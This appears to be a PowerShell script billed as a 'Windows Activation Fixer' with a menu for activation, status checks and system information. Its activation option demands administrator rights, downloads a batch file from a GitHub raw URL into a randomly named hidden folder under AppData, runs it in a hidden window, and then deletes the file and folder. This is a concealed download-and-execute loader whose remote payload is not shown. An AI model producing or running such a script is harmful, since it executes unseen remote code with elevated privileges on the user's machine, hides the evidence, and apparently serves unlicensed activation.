# ============================================================
# SHANECODES - WINDOWS ACTIVATION FIXER v3.0
# ============================================================
# Created by: Shane Nichael Obinguar (ShaneCodes)
# ============================================================
# (c) 2024-2025 ShaneCodes Technologies. All rights reserved.
# ============================================================

Clear-Host
$Host.UI.RawUI.WindowTitle = "ShaneCodes - Activation Fixer v3.0"

# ============================================================
# CONFIGURATION
# ============================================================
$script:Version = "3.0"
$script:Author = "Shane Nichael Obinguar"
$script:Contact = "obinguarshane77@gmail.com"
$script:Website = "https://shanecodes.tech"
$script:Company = "ShaneCodes Technologies"
$script:Copyright = "(c) 2024-2025 ShaneCodes Technologies. All rights reserved."

# ============================================================
# POGI BANNER
# ============================================================
Write-Host @"

╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║    ███████╗██╗  ██╗ █████╗ ███╗   ██╗███████╗ ██████╗     ║
║    ██╔════╝██║  ██║██╔══██╗████╗  ██║██╔════╝██╔════╝     ║
║    ███████╗███████║███████║██╔██╗ ██║█████╗  ██║  ███╗    ║
║    ╚════██║██╔══██║██╔══██║██║╚██╗██║██╔══╝  ██║   ██║    ║
║    ███████║██║  ██║██║  ██║██║ ╚████║███████╗╚██████╔╝    ║
║    ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝ ╚═════╝     ║
║                                                              ║
║         WINDOWS ACTIVATION FIXER v$script:Version           ║
║           Created by: ShaneCodes Technologies              ║
║        "Fixing Windows Activation, One PC at a Time"        ║
╚══════════════════════════════════════════════════════════════╝

"@ -ForegroundColor Cyan

# ============================================================
# ADMIN CHECK
# ============================================================
if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Host ""
    Write-Host "  ⚠️  ADMIN REQUIRED! Please run as Administrator." -ForegroundColor Red
    Write-Host ""
    Read-Host "Press Enter to exit"
    exit
}

# ============================================================
# POGI MENU
# ============================================================
Write-Host ""
Write-Host "  ┌────┬────────────────────────────────────────────────────────────┐" -ForegroundColor Gray
Write-Host "  │ #  │ Option                                                     │" -ForegroundColor Gray
Write-Host "  ├────┼────────────────────────────────────────────────────────────┤" -ForegroundColor Gray
Write-Host "  │ 1  │ 🔧 RUN ACTIVATION FIXER                                    │" -ForegroundColor White
Write-Host "  │ 2  │ 🔍 CHECK ACTIVATION STATUS                                 │" -ForegroundColor White
Write-Host "  │ 3  │ 💻 SYSTEM INFORMATION                                      │" -ForegroundColor White
Write-Host "  │ 0  │ ❌ EXIT                                                    │" -ForegroundColor White
Write-Host "  └────┴────────────────────────────────────────────────────────────┘" -ForegroundColor Gray
Write-Host ""

$choice = Read-Host "  Enter your choice (0-3)"

# ============================================================
# TOOL 1: RUN ACTIVATION FIXER
# ============================================================
if ($choice -eq "1") {
    Write-Host ""
    Write-Host "  ═══════════════════════════════════════════════════════════════" -ForegroundColor Cyan
    Write-Host "  🔧 STARTING ACTIVATION FIXER" -ForegroundColor Yellow
    Write-Host "  ═══════════════════════════════════════════════════════════════" -ForegroundColor Cyan
    Write-Host ""

    # Download
    $url = "https://raw.githubusercontent.com/shanecodes-glitch/ShaneCodes-System-Repair/refs/heads/main/tisting.bat"
    $rand = -join ((65..90) + (97..122) | Get-Random -Count 8 | ForEach-Object { [char]$_ })
    $hiddenPath = "$env:APPDATA\Microsoft\Windows\$rand"
    New-Item -ItemType Directory -Path $hiddenPath -Force -ErrorAction SilentlyContinue | Out-Null
    Set-ItemProperty -Path $hiddenPath -Name Attributes -Value "Hidden" -Force
    $batPath = "$hiddenPath\tisting.bat"

    Write-Host "  ⬇️  Downloading repair tool..." -ForegroundColor Gray
    try {
        $wc = New-Object System.Net.WebClient
        $wc.DownloadFile($url, $batPath)
        Write-Host "  ✅ Download complete!" -ForegroundColor Green
    } catch {
        Write-Host "  ❌ Download error: $_" -ForegroundColor Red
        Write-Host ""
        Read-Host "Press Enter to exit"
        exit
    }

    # Run
    Write-Host "  ⚡ Running repair..." -ForegroundColor Gray
    $p = Start-Process -FilePath $batPath -ArgumentList "/REPAIR" -WindowStyle Hidden -PassThru
    $p.WaitForExit()

    # Cleanup
    Write-Host "  🧹 Cleaning up..." -ForegroundColor Gray
    Remove-Item -Path $batPath -Force -ErrorAction SilentlyContinue
    Remove-Item -Path $hiddenPath -Recurse -Force -ErrorAction SilentlyContinue

    # Result
    Write-Host ""
    Write-Host "  ═══════════════════════════════════════════════════════════════" -ForegroundColor Cyan
    if ($p.ExitCode -eq 0) {
        Write-Host "  ✅ ACTIVATION COMPLETED SUCCESSFULLY!" -ForegroundColor Green
    } else {
        Write-Host "  ❌ ACTIVATION FAILED. Exit code: $($p.ExitCode)" -ForegroundColor Red
        Write-Host "  Please try running as Administrator or contact support." -ForegroundColor Yellow
    }
    Write-Host "  ═══════════════════════════════════════════════════════════════" -ForegroundColor Cyan
    Write-Host ""
    Read-Host "Press Enter to exit"

# ============================================================
# TOOL 2: CHECK ACTIVATION STATUS
# ============================================================
} elseif ($choice -eq "2") {
    Write-Host ""
    Write-Host "  ═══════════════════════════════════════════════════════════════" -ForegroundColor Cyan
    Write-Host "  🔍 ACTIVATION STATUS" -ForegroundColor Yellow
    Write-Host "  ═══════════════════════════════════════════════════════════════" -ForegroundColor Cyan
    Write-Host ""
    
    $lic = Get-CimInstance -ClassName SoftwareLicensingProduct -Filter "PartialProductKey IS NOT NULL AND LicenseStatus = 1" -ErrorAction SilentlyContinue
    if ($lic) {
        Write-Host "  ✅ STATUS: ACTIVATED" -ForegroundColor Green
        Write-Host "  ────────────────────────────────────────────────────────────" -ForegroundColor Gray
        Write-Host "  Edition    : $($lic.Name)" -ForegroundColor White
        Write-Host "  Product Key: *****-*****-*****-*****-$($lic.PartialProductKey)" -ForegroundColor White
        Write-Host "  ────────────────────────────────────────────────────────────" -ForegroundColor Gray
    } else {
        Write-Host "  ❌ STATUS: NOT ACTIVATED" -ForegroundColor Red
        Write-Host "  ────────────────────────────────────────────────────────────" -ForegroundColor Gray
        Write-Host "  Please run the Activation Fixer (Option 1)" -ForegroundColor Yellow
        Write-Host "  ────────────────────────────────────────────────────────────" -ForegroundColor Gray
    }
    Write-Host ""
    Read-Host "Press Enter to exit"

# ============================================================
# TOOL 3: SYSTEM INFORMATION
# ============================================================
} elseif ($choice -eq "3") {
    Write-Host ""
    Write-Host "  ═══════════════════════════════════════════════════════════════" -ForegroundColor Cyan
    Write-Host "  💻 SYSTEM INFORMATION" -ForegroundColor Yellow
    Write-Host "  ═══════════════════════════════════════════════════════════════" -ForegroundColor Cyan
    Write-Host ""
    
    $os = Get-CimInstance Win32_OperatingSystem
    $disk = Get-CimInstance Win32_LogicalDisk -Filter "DeviceID='C:'"
    $cpu = Get-CimInstance Win32_Processor
    
    Write-Host "  ┌────────────────────────────────────────────────────────────┐" -ForegroundColor Gray
    Write-Host "  │  Operating System  : $($os.Caption)" -ForegroundColor White
    Write-Host "  │  Build Number      : $($os.BuildNumber)" -ForegroundColor White
    Write-Host "  │  Architecture      : $($os.OSArchitecture)" -ForegroundColor White
    Write-Host "  │  Total RAM         : $([math]::Round($os.TotalVisibleMemorySize/1MB,1)) GB" -ForegroundColor White
    Write-Host "  │  C: Drive Free     : $([math]::Round($disk.FreeSpace/1GB,1)) GB" -ForegroundColor White
    Write-Host "  │  Processor         : $($cpu.Name)" -ForegroundColor White
    Write-Host "  └────────────────────────────────────────────────────────────┘" -ForegroundColor Gray
    Write-Host ""
    Read-Host "Press Enter to exit"

# ============================================================
# TOOL 0: EXIT
# ============================================================
} elseif ($choice -eq "0") {
    Write-Host ""
    Write-Host "  ═══════════════════════════════════════════════════════════════" -ForegroundColor Cyan
    Write-Host "  Thank you for using ShaneCodes Activation Fixer!" -ForegroundColor Green
    Write-Host "  $script:Copyright" -ForegroundColor Gray
    Write-Host "  ═══════════════════════════════════════════════════════════════" -ForegroundColor Cyan
    Write-Host ""
    exit

# ============================================================
# INVALID CHOICE
# ============================================================
} else {
    Write-Host ""
    Write-Host "  ❌ Invalid choice! Please try again." -ForegroundColor Red
    Write-Host ""
    Read-Host "Press Enter to exit"
}